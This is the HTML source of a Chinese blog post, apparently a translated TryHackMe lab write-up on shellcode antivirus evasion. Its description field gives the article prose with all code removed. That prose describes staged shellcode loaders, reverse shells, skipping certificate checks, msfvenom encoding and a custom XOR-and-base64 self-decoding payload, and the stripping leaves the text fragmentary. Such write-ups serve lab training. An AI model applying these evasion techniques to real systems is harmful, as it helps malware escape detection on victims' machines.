<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>THM-ShellCode免杀 | hybcx</title><meta name="keywords" content="TryHackMe"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="THM-ShellCode免杀"><meta name="application-name" content="THM-ShellCode免杀"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="THM-ShellCode免杀"><meta property="og:url" content="http://hybcx.xyz/2024/08/01/thm-shellcode-mian-sha/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="学习如何针对Shellcode使用编码、加密、加壳器和绑定器。 0x01 简介 在本文中，我们将探讨如何构建和交付有效载荷，并且将侧重学习怎样规避常见的反病毒引擎的检测。我们将研究攻击者可以使用的不同AV规避(免杀)技术，并简单讨论每种规避技术的优缺点。 学习目标  了解shellcode是如何制作"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="学习如何针对Shellcode使用编码、加密、加壳器和绑定器。 0x01 简介 在本文中，我们将探讨如何构建和交付有效载荷，并且将侧重学习怎样规避常见的反病毒引擎的检测。我们将研究攻击者可以使用的不同AV规避(免杀)技术，并简单讨论每种规避技术的优缺点。 学习目标  了解shellcode是如何制作"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/08/01/thm-shellcode-mian-sha/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'THM-ShellCode免杀',
  postAI: '',
  pageFillDescription: '0x01 简介, 学习目标, 前置学习基础, 0x02 挑战, 0x03 PE结构, 什么是PE, 为什么需要了解PE, 使用PE-Bear工具, 0x04 Shellcode介绍, 一个简单的Shellcode, 0x05 生成Shellcode, 使用公开工具生成shellcode, Shellcode注入, 生成原始shellcode, 0x06 有效载荷(Payload)分段, 无阶段有效载荷, 分阶段有效载荷, 无阶段VS分阶段, Metasploit中的Payload, 创建自己的Stager(分阶段载入器), 使用我们的Stager运行反向shell, 0x07 编码和加密介绍, 什么是编码？, 什么是加密？, 为什么需要了解编码和加密？, 0x08 Shellcode的编码和加密, 使用MSFVenom进行编码, 使用MSFVenom进行加密, 创建自定义有效载荷, 编码器, 自解码有效载荷, 0x09 加壳器(Packers), 对应用程序进行加壳, 加壳器和AVs(反病毒), 对我们的shellcode进行加壳, 补充, 0x10 绑定器(Binders), 使用msfvenom进行绑定处理, 绑定器和AVs(反病毒), 0x11 最终实验任务, 0x12 总结学习如何针对使用编码加密加壳器和绑定器简介在本文中我们将探讨如何构建和交付有效载荷并且将侧重学习怎样规避常见的反病毒引擎的检测我们将研究攻击者可以使用的不同规避免杀技术并简单讨论每种规避技术的优缺点学习目标了解是如何制作的探索分阶段有效载荷的优点和缺点创建隐秘的以尝试规避反病毒检测前置学习基础建议先了解反病毒软件的工作原理以及了解基础的加密和编码知识虽然不严格要求但是能掌握一些基本的汇编语言知识对于学习本文也很有帮助此外还建议读者对阅读代码和理解函数能够有基本的了解反病毒简介红队挑战在与本文相关的实验环境中为我们提供了一台带有应用程序的目标计算机以便我们上传有效载荷在完成上传之后会由反病毒软件对进行检查如果没有检测到恶意软件那么就会被成功执行反之则无法执行我们的最终操作目标是规避目标虚拟机上已安装的反病毒软件的检测从而尝试捕获目标文件系统中的内容在最终测试任务中我们将使用本文所介绍的规避技术来构建并将其上传至页面此页面的链接可在目标机器的桌面上找到以供软件检查关于本文最终测试任务需要注意的要点尝试结合使用本文所讨论的各种规避技术目标站点仅支持上传文件一旦反病毒软件对已上传的文件进行扫描并且没有检测到恶意代码那么该文件就会被执行因此如果规避成功的话我们将能够收到一个反向为了完成本文的所有实验目标我们需要在与本文相关的实验房间中点击部署目标虚拟机完成部署后我们就可以通过浏览器内置分页来直接访问目标机器如果我们想使用所提供的来通过访问目标虚拟机我们就需要用到以下凭据所提供的也需要我们部署在此我们不建议使用访问和操作目标机器因为我们在完成本文的普通实验任务与最终测试任务时本身就需要用到分机器目标机进行操作会更加方便有条理注意与本文相关的最终实验任务将在我们完成对本文的规避技术的基础学习之后再进行具体的实验操作将在本文的倒数第二小节内容中进行介绍目标虚拟机的桌面截图下载链接结构本小节将重点介绍二进制文件的数据结构的一些高级基本元素什么是可执行文件格式又名可移植可执行是一种保存文件所需信息的数据结构也是一种在计算机磁盘上组织可执行文件代码的方法操作系统组件例如和加载程序可以将文件加载到内存中并能根据在相关结构中找到的已解析的文件信息来执行该文件一般而言二进制文件如和目标代码文件的默认文件结构都具有相同的结构并且都适用于操作系统的架构和目标代码文件是源代码文件通过编译器和汇编器处理后生成的中间文件目标代码是编译器或汇编器处理源代码之后所生成的代码它一般由机器代码或接近于机器语言的代码组成而目标文件或目标代码文件即存放目标代码的计算机文件它是一种二进制文件结构包含了用于保存有关二进制文件信息的各个部分其中最重要的一个部分是标头它包含元数据信息指针以及指向内存中地址段的链接另外一个部分则是数据节它包括了一些容器而这些容器又用于包含加载程序运行程序所需的信息例如可执行代码资源库链接数据变量等信息结构中有不同类型的数据容器每种数据容器保存了不同的数据此处的数据容器指的是节此节会存储程序的实际代码此节会保存已初始化和已定义的变量此节会保存未初始化的数据未赋值的已声明的变量此节会包含只读数据此节会包含可导出的对象和相关的表信息导入的对象和相关的表信息映像重定位信息链接程序所使用的外部资源如图像图标嵌入式二进制文件和清单文件其中包含了关于程序版本作者公司和版权的所有信息结构是一个庞大而复杂的主题在本小节中我们仅提供关于结构的高级概述关于该主题以下博客文章可供参考学习内部机制基础学习剖析标头学习此外我们还可以通过查看关于格式的官方文档来获得有关结构的更深入的详细信息当我们尝试查看文件的内容时会看到一堆人类无法阅读的字节这些内容所包含的是加载程序在运行文件时所需的所有详细信息以下是加载程序读取可执行二进制文件并将其作为进程运行的示例步骤处理标头部分解析和可选标头以提供有关文件的信息字段值为它将告诉加载程序这是一个文件文件签名文件是针对还是架构编译的解析节表详细信息文件所包含的节的数目将文件内容映射到内存中地址和的偏移量相对虚拟地址和相关的地址将导入项和其他对象加载到内存中定位地址并运行主执行函数为什么需要了解我们有多个原因需要了解首先因为我们想要进行加壳和脱壳而加壳脱壳技术要求我们去了解关于结构的详细信息另一个原因是软件和恶意软件分析人员会根据标头和其他节中的信息来分析文件因此作为攻击者为了创建或修改针对机器的具有规避能力的恶意软件我们需要了解文件的结构以及恶意可以存储的位置我们可以通过定义和初始化变量的方式来控制在哪个数据节中存储以下是一些示例它们展示了如何在中存储将定义为函数中的局部变量这会将其存储在节中将定义为全局变量这会将其存储在节中将作为原始二进制文件存储在图标图像中并在代码中链接它这会导致其显示在数据节中我们可以添加一个自定义数据节来存储使用工具与本文相关的目标虚拟机是一台机器其中有解析文件和读取信息所需的工具我们可以在目标虚拟机的桌面文件夹中找到一个软件的副本它有助于我们检查可执行文件的结构标头节等可以为我们提供一个图形用户界面来显示所有与文件相关的详细信息如果想使用加载文件以进行分析请选择使用成功加载文件后我们就可以看到相关的所有信息下面的截图显示了已加载的文件的详细信息包括了我们在上文中所讨论的标头和节现在是时候尝试一下了加载文件来回答以下问题该文件位于以下位置介绍是一组精心设计的机器代码指令它将告诉易受攻击的程序运行一些额外功能并且在大多数情况下它能够向攻击者提供针对目标系统的访问权限或者可以创建反向一旦被注入到进程中并由易受攻击的软件或程序执行它就会修改正常的代码运行流程从而更新程序的寄存器和函数以执行攻击者所构建的代码一般用汇编语言编写并可转译为十六进制操作码编写独特的自定义的有助于显著地规避反病毒软件但是这并不是一件容易的事情需要我们拥有出色的汇编语言知识和技能一个简单的为了编写自定义的我们可能需要具备以下技能对和架构有很好的了解掌握了良好的汇编语言知识对语言等编程语言有丰富的了解熟悉和操作系统为了生成我们自己的我们需要编写并从汇编机器代码中提取字节在本文实验环境中我们可以使用为创建一个简单的用于写入字符串我们可能会用到以下两个主要的函数系统写入函数用于打印出我们所选择的字符串系统退出函数用于终止程序的执行为了调用上述两个函数我们将使用系统调用是程序用于请求内核执行某些操作的方式我们可以请求内核向屏幕写入一个字符串然后退出程序每个操作系统对于系统调用都有不同的调用约定这意味着如果我们要在中使用写入函数就可能要使用与系统中不同的系统调用对于位系统我们可以通过设置以下值从内核调用所需的函数上表告诉我们需要在不同处理器寄存器中设置哪些值才能使用调用和函数对于位寄存器用于指示我们希望调用的内核中的函数将设置为将使内核执行将设置为将使内核执行这两个函数都需要一些参数才能工作这些参数可以通过和寄存器进行设置我们可以在以下链接中找到可用的位系统调用的完整参考对于通过发送的第一个参数是要写入的文件描述符中的第二个参数是指向我们要打印的字符串的指针中的第三个参数是要打印的字符串的大小对于需要被设置为程序的退出代码我们将使用代码这意味着程序成功退出我们可以将以下代码复制到中名为使用命令创建的文件中我们简单解释一下上述汇编代码首先我们的消息字符串存储在节的末尾由于我们需要一个指向该消息的指针来打印它因此我们将跳转到消息本身之前的调用指令当得到执行该调用之后的下一条指令的地址将被压入堆栈此地址对应于我们的消息所在的位置注意在上述汇编代码中消息末尾的相当于二进制文件中的换行符接下来程序会启动例行程序并为我们的第一个函数准备所需的寄存器我们通过在寄存器中设置来指定函数系统调用号代表我们将设置为以将字符串打印到用户控制台文件描述符代表标准输出我们弹出一个指向字符串的指针该指针是在调用时被压入的并将其存储到中将要写入的字节数放入寄存器执行使用准备好的值来执行函数从而将打印到标准输出对于上述汇编代码中的剩余部分我们会执行相同的操作来调用函数我们将系统调用号代表放入寄存器将退出状态码放入寄存器最后执行来退出程序现在我们可以编译并链接汇编代码以创建可执行文件并最终执行这个程序如上所示我们可以使用命令编译文件而命令选项则表明我们正在为位进行编译处理请注意经过编译之后我们将得到一个以为结尾的文件其中包含了目标代码但是它还需要经过链接处理以便成为一个有效的可执行文件为此我们可以使用命令将目标文件链接成可执行文件其中命令选项可用于指定要输出的可执行文件的名称我们已经编译好了程序让我们使用命令通过转储编译后的二进制文件的节来提取我们需要从上面的输出中提取十六进制值为此我们可以先使用将节以二进制格式转储到名为的新文件中我们得到的包含了二进制格式的为了能够使用它我们还需要将其转换为十六进制我们可以使用命令这将直接以字符串形式输出二进制文件的内容最后我们得到了来自程序集的格式化的为了确认已提取的是否会按照我们的预期进行工作我们可以将注入到程序中并尝试进行执行这是一个使用编译器的命令用于编译名为的语言源代码文件并生成一个可执行文件下面是对每个参数的解释是编译器集合的缩写用于编译程序启用调试信息这将在生成的可执行文件中包含调试信息以便在调试过程中可以查看变量值跟踪程序执行等启用所有警告选项以便编译器能够检测并显示潜在的代码问题允许可执行文件的堆栈上执行代码这对于某些特定的应用场景可能是必需的但在安全性方面需要谨慎使用源代码文件的名称这里假设为指定输出可执行文件的名称为综上所述该命令将编译名为的语言源代码文件并生成一个名为的可执行文件使用参数将禁用保护保护是一种针对硬件和操作系统的安全特性它能防止内存中的数据被误认为是可执行代码而被执行在默认情况下操作系统会将堆栈设置为不可执行以便提高系统的安全性如上所示我们是通过禁用保护来编译程序的这可能会阻止我们在数据段或堆栈中正确执行代码了解及其创建方式至关重要尤其是在处理加密和编码时修改您的程序以执行以下旗帜是什么生成使用公开工具生成我们可以使用特定的编程语言生成特定格式的这主要取决于我们自己例如如果我们的植入器主文件包含了将要发送给受害者的并且是用编写的那么我们就需要生成能够在编程环境中工作的格式通过公开工具生成的优点是我们不需要从头开始编写自定义甚至不需要了解很多的汇编语言知识大多数公开的框架都会提供与平台兼容的自己的生成器使用公开工具生成的缺点是大多数或者可以说全部可生成的都是软件供应商所熟知的所以很容易被反病毒软件检测到我们可以在由所提供的上使用并生成能够执行文件的例如创建一个可运行的如下所示我们使用生成了一个能够执行计算器程序的计算器被广泛用作恶意软件开发过程中的一个测试示例这是一种概念证明展示如果上述成功生效就会在相关的计算机上弹出一个计算器程序实例注入攻击者可以使用各种技术将注入到正在运行的或新的线程进程中通过使用注入技术可以修改程序的正常执行流程以更新程序的寄存器和函数来执行攻击者自己的代码我们刚才已经使用生成了一个简单的现在让我们在操作系统上执行它以下是包含我们刚才所生成的的代码该代码将被注入到内存中并最终会执行在上我们可以将以下内容保存在名为的文件中我们需要继续对文件进行编译处理以得到一个文件为系统编译程序在中获得上述文件之后我们可以将其传输到目标计算机中并执行它为了传输文件我们可以在中使用命令通过命令访问处的共享用户密码如上所示我们能够将文件复制到目标计算机的目录中我们作为攻击者所构造的在目标机器上的执行情况如下我们也可以在目标虚拟机中将上传到检查器页面看看此文件能否通过本文最终实验所涉及的反病毒检查注意如果是在目标虚拟机上进行操作我们也可以通过访问到检查器页面框架有许多其他格式和类型可以满足您的所有需求我们强烈建议您进行更多实验并通过生成不同的来扩展您的知识前面的示例展示了如何生成并在目标计算机中执行它当然您可以复制相同的步骤来创建不同类型的例如生成原始也可以被存储在文件中这是一种原始数据格式在这种情况下我们可以使用命令来获取相关的我们得到的是二进制文件的十六进制表示代表的是原始二进制文件让我们使用创建一个原始二进制文件来获取对我们刚才所创建的文件运行中的命令如果我们将上面的输出结果与之前使用生成的进行比较就会发现它们是互相匹配的通常情况下我们可能无法直接在目标计算机上执行一个二进制的文件因此我们需要创建一个加载器或脚本以便将文件中的加载到目标机器的内存中并进行执行在下一小节中我们在使用分阶段有效载荷时就会创建一个加载器来将原始形式的加载到目标机器的内存中并执行有效载荷分段为了成功绕过反病毒软件我们可以思考应该怎样将最终的传递给受害机器根据不同的传递方法我们会发现有效载荷通常可被分为无阶段有效载荷与分阶段有效载荷在本小节内容中我们将简单研究这两种有效载荷的差异以及各自的优点有效载荷是指在计算机安全中用于利用漏洞或者攻击目标的代码它通常是指攻击者注入到受害计算机中的恶意代码使用的目的是为了实现攻击者的攻击要求比如获取敏感信息控制计算机系统或传播恶意软件等是一种特殊类型的通常用于利用缓冲区溢出漏洞是一段精心编写的机器码攻击者会通过利用程序或操作系统的弱点将它注入到受攻击的计算机系统中并进行执行通常可用于获得系统命令执行的权限以便攻击者进一步控制受感染的计算机简而言之是一种特定类型的通常会被用于实现对缓冲区溢出漏洞的利用并会以机器码的形式注入到受攻击的计算机系统中无阶段有效载荷无阶段有效载荷会将最终的直接嵌入到文件自身中我们可以把它看作是一个打包的应用程序该程序能够在一个单步骤进程中执行上文所介绍的就是此形式我们在一个可执行文件中嵌入了一个简单的用于执行的这个过程就是在创建无阶段有效载荷在下面的示意图中当目标用户执行恶意文件时嵌入式的就会执行从而为攻击者提供一个反向例子以下是一种使用所生成的无阶段有效载荷的简单方法在攻击机上使用生成指定无阶段有效载荷在中进行操作在实际使用以下命令时请填充的值为攻击机执行这条命令我们将得到原始的十六进制字节形式的然后我们就可以将其填充到一个能够执行内存写入操作的程序中当然我们也可以不使用而是使用这将生成代码然后我们可以将此代码传输到受害机器上并进行编译执行也可以先在攻击机上编译得到文件随后再将文件传输到受害机器上执行将刚才得到的十六进制的复制粘贴到以下程序中在目标机器中创建该代码文件填充内容分配可执行内存空间将复制到可执行内存空间创建线程并执行等待线程完成在目标虚拟机中编译上述程序在目标机器中最后在受害机器中执行相关的文件即可还需提前在攻击机终端设置一个端口监听器分阶段有效载荷分阶段有效载荷通过使用中间来工作这些中间能够充当引导执行最终的步骤每一个中间都可被称为其主要目标是提供一种检索最终并进行执行的方法虽然这种有效载荷可以有很多阶段但是通常情况下攻击者所涉及的是二阶段有效载荷其中第一阶段我们可称之为是一个存根它将在受害机器上回连攻击者所控制的机器以下载最终的并让其得到执行第一阶段的常规名称是然后第二阶段通常是其中负责初始化连接和加载而则是更大的它负责执行以建立完整的连接存根是指一种特殊类型的它通常用于利用软件漏洞以获取对受影响系统的控制权存根的作用是在受影响的程序中创建一个连接点以便后续的恶意代码可以被注入和执行存根通常比较小它的主要目的是为了在受影响的程序中创建一个执行载荷的入口点这样的通常是更大的恶意代码的一部分它们一起协同工作以实现攻击者的目的一旦检索到最终存根就会将其注入到有效载荷的进程的内存中的某个位置并执行它如下所示无阶段分阶段在决定使用哪种类型的有效载荷时我们必须了解我们将要攻击的环境因为根据具体的攻击场景每种有效载荷都有各自的优点和缺点对于无阶段有效载荷你会发现它有以下优点生成的可执行文件包含了让我们的工作所需的所有内容这种有效载荷可以在不需要额外的网络连接的情况下执行而网络交互越少被检测到的可能性也越小如果你正在攻击网络连接非常受限的目标主机你可能会希望将整个有效载荷放置在单个包中对于分阶段有效载荷而言它将具有以下优点磁盘占用空间小由于只负责下载最终的因此所占用的空间可能很小最终的不会被嵌入到可执行文件中即使我们所使用的被捕获蓝队将只能访问存根仅此而已最终的会被加载到内存中并且不会接触计算机磁盘这使得这种有效载荷更不容易被反病毒解决方案所检测到你可以对很多复用相同的植入器因为你可以简单地替换提供给受害机器的最终总之除非我们添加了一些上下文环境否则我们很难说哪种类型的有效载荷更好一般而言无阶段有效载荷更适合针对那些具有大量边界安全设施的网络因为这种有效载荷并不依赖于从外部网络下载最终的例如我们可以针对封闭网络环境中的目标计算机执行跌落攻击当我们无法回连攻击机时无阶段有效载荷就是最好的选择另一方面当我们希望将计算机上的占用空间减少到最低限度时分阶段有效载荷会非常有用由于是在内存中执行最终的有效载荷因此一些解决方案可能会更难检测到它们这种有效载荷还可以很好地避免暴露我们所使用的因为相关的任何时候都不会作为工件被放入到受害机器的磁盘中中的当我们使用创建有效载荷或者在中直接使用有效载荷时可以指定选择分阶段无阶段有效载荷例如如果想生成一个反向我们会发现在中有两个有效载荷可用于完成此目的但是它们的名称略有不同在具体名称中注意之后的和有效载荷类型无阶段有效载荷分阶段有效载荷中的有效载荷类型可以通过其具体名称来区别如果在名称中之后的符号是则对应的类型是无阶段如果名称中之后的符号是则对应的类型就是分阶段的例如如果想要使用无阶段的那么就应该选择而不是创建自己的分阶段载入器为了创建自定义的分阶段有效载荷我们将基于所提供的代码来进行修改以得到一个自己的我们可以在目标机器上找到这个分阶段载入器的完整代码文件相关路径如下在目标机器中创建该代码文件注意在实际使用时修改该代码中的值这段代码是一个程序它能够根据代码中给定的下载并将其加载到内存中执行代码主要使用了一些函数其中包括用于在进程的虚拟地址空间中分配内存块用于创建一个新的线程并在指定的内存地址开始执行用于等待一个线程或对象的状态变为可信赖在方法中设置了一个在方法中使用下载指定上的之后调用函数在内存中分配一块可执行的内存区域并使用将复制到这块内存中接着使用函数在刚刚分配的内存地址上启动一个新线程并使用等待线程的结束需要注意的是此代码片段缺少异常处理和错误检查因此在实际使用时应该添加适当的错误处理和异常处理机制接下来我们可以对上述代码进行简单分析上述代码的第一部分将通过导入一些函数我们实际所需要的是中的以下三个函数函数描述允许我们预留一些内存供使用创建一个线程作为当前进程的一部分用于线程同步它允许我们等待线程完成后再继续负责导入上述这三个函数的代码部分如下所示上述代码中最重要的部分是在函数中其中实现了分阶段载入器逻辑函数将接收一个并从中下载要被执行的函数的第一部分将创建一个新的对象该对象允许我们使用请求下载在发出实际请求之前我们将在使用请求时重写负责验证证书的方法这样就不会提示自签名或无效证书否则我们就需要在承载有效载荷的服务器上使用相关证书在此之后我们将调用方法从给定的下载并将其存储到变量中这段代码创建了一个实例并针对使用自签名证书的连接设置了一个回调函数该回调函数始终返回这样就能跳过证书验证然后在代码中还将属性设置为了这样可以确保使用最新的安全协议来进行通信最后调用方法下载位于指定上的并将其保存在数组中需要注意的是如果服务器可以使用有效的证书则不应将设置为始终返回而应进行适当的证书验证以确保与服务器的安全连接一旦我们的被成功下载并在变量中处于可用状态我们就需要在实际运行它之前将其复制到可执行的内存中为此我们将在上述代码中使用函数向操作系统请求内存块注意我们将请求足够的内存来分配长度为的字节并会设置标志使已分配的内存变得可执行可读和可写一旦我们的可执行内存块预留成功并且被分配给了变量我们就可以使用函数来将变量的内容复制到变量中现在我们已经在可执行内存块中分配了的副本我们可使用函数在当前进程上生成一个新线程来执行我们的在相关代码内容中我们可以看到传递给函数的第三个参数将指向存储了的这样当线程启动时就会像常规函数一样运行的内容函数的第五个参数被设置为表示线程将立即启动成功创建了线程之后我们将调用函数来指示当前程序必须等待线程执行完成才能继续这可以防止我们的程序在线程有机会执行之前就关闭方法是一个函数它会创建一个新的线程并返回该线程的句柄和线程通过将参数声明为可以在方法调用结束后通过对的修改使得在方法外部也能获得新线程的的作用是让方法将新线程的保存在变量中以便后续的操作使用最后我们将在目标计算机中编译包含了上述完整代码的文件为此我们将在终端中使用以下命令在目标机器中完成编译之后我们将得到一个可执行的文件使用我们的运行反向编译好了文件之后我们需要设置一个服务器来托管最终的请记住我们的将连接到该服务器以检索并在受害计算机的内存中执行它让我们首先在中生成最终文件名称需要和中的匹配在中进行操作在实际使用时请填充值请注意我们的最终使用的是原始格式因为我们在上文中所创建的会直接将其下载的任何内容都加载到受害机器的内存中现在我们有了最终的让我们继续设置一个简单的服务器来托管它首先我们需要使用以下命令来创建一个自签名证书在中进行操作当我们执行上面命令时系统会要求我们提供一些信息我们直接按键即可因为我们并不需要证书有效我们在已经设置好了跳过证书验证现在我们可以使用和以下命令来创建一个简单的服务器用于托管我们所生成的最终在中进行操作上述步骤全部准备就绪之后我们就可以在受害机器上运行我们的可执行文件了会连接到机器上的服务器并会检索文件然后将其加载到内存中并在受害机器进行运行此外我们还需要预先在的终端上设置一个监听器以便成功接受反向在中进行操作此处的端口号将与我们前面运行命令时所指定的端口号保持一致编码和加密介绍什么是编码编码是根据编码算法或编码类型将数据从原始状态转变为特定格式的过程它可以被应用于多种数据类型例如视频和二进制文件图像等编码是一个重要的概念通常可用于各种目的包括但不限于程序编译与执行数据存储与传输文件转换等数据处理当涉及到规避技术时我们也可以尝试使用编码来隐藏二进制文件中的字符串然而在实际情况下编码其实还不足以达到规避软件的目的如今反病毒软件已经较为智能软件可以分析二进制文件一旦在其中找到了编码的字符串就可以对其进行解码以检查原始的文本形式我们还可以同时使用两种或两种以上的编码算法这可以使得软件更难以找出隐藏的内容如下图所示我们可以将字符串转换为十六进制表示然后再使用进行编码在这种情况下我们需要确保我们的植入程序可以处理此类编码以便将字符串恢复到其原始状态什么是加密加密是信息和数据安全的基本要素之一其重点是防止未经授权的访问和数据操纵加密过程涉及将明文未加密的内容转换成被称为密文的加密版本如果不知道加密中所使用的算法以及密钥那么就无法读取或解密密文与编码一样加密技术也可被用于多种目的例如安全地存储和传输数据以及进行端到端加密加密可以以两种方式被使用在双方之间使用共享密钥或者使用公钥私钥有关加密的更多信息可以参考以下博客文章加密技术密码学基础学习为什么需要了解编码和加密反病毒供应商通常会使用静态检测或动态检测技术来实施其反病毒软件这会将大多数公开的网络安全工具例如等列入黑名单因此在不修改这些公开的网络安全工具所生成的的情况下我们所使用的植入程序被检测出来的概率就很高编码和加密都有助于实现规避技术我们可以对植入程序中所使用的进行编码加密以便在运行时将其隐藏起来避免其被软件发现而且这两种技术不仅可以用来隐藏还可以用来隐藏函数变量等在本文中我们将重点关注如何通过加密来规避的检测的编码和加密使用进行编码虽然等公开工具能够提供编码和加密功能但是供应商很了解这些常见的公开工具所构建有效载荷的方式并能采取相应措施来进行检测因此如果我们直接使用框架生成的就可能会轻易地被受害者机器上的软件所检测到我们简单编码一下所生成的以验证编码之后的能否被软件检测到首先我们使用以下命令列出可用的所有编码器在上我们可以通过参数开关来指示想要使用编码器并且可以继续通过参数开关来指定我们想要对进行三次编码处理编码器迭代次数在上在实际使用时请填充值我们可以略微修改上述命令以生成经过编码处理的可执行的文件然后把该文件上传至检查器页面我们可以在攻击机上通过访问检查器页面我们发现简单地对进行编码并不能有效地规避检测所以接下来我们将尝试对进行加密处理使用进行加密通过使用我们可以轻松地得到已加密的有效载荷首先我们可以使用以下命令来列出中可用的加密算法在机器中让我们构建一个经过加密的有效载荷注意在使用此类型的算法时我们还需要指定一个密钥在机器中在实际使用以下命令时请填充值我们再次将生成的文件上传到检查器页面我们会发现依然会被所标记原因可能是供应商做好了足够充足的准备来确保其产品能够检测到常见的我们可以在攻击机上通过访问检查器页面创建自定义有效载荷既然简单的编码和加密都无法有效地规避检测那么我们接下来将会尝试使用我们自己定义的编码方案这样反病毒软件就可能不知道如何分析我们的有效载荷请注意在此我们不必做任何太复杂的事情只要得到的足以让进行分析即可接下来我们将采用和的组合来处理由所生成的简单反向以此尝试绕过让我们首先使用生成适配的反向在机器中在实际使用命令时请填充值编码器在构建实际的有效载荷之前我们将创建一个编码器程序该程序将采用生成的并会以我们想要的方式对其进行编码在此编码器程序中我们首先会使用自定义密钥对进行加密处理然后再继续使用对其进行编码处理下面是编码器的完整代码示例该代码文件可以在目标机器中的以下路径找到在目标机器中创建该代码文件在实际使用时我们只需要将所生成的填充到上述编码器代码中的变量处然后再对目标机上的编码器代码文件进行编译执行即可我们可以在目标机器上使用以下命令来编译并执行编码器在目标机器中我们将得到经过编码之后的内容自解码有效载荷现在我们有了一个已编码的有效载荷我们需要继续调整我们用于加载最终的代码此代码会将加载到内存并执行以便该代码文件在执行之前能够解码为了与编码器进行匹配我们将会以和编码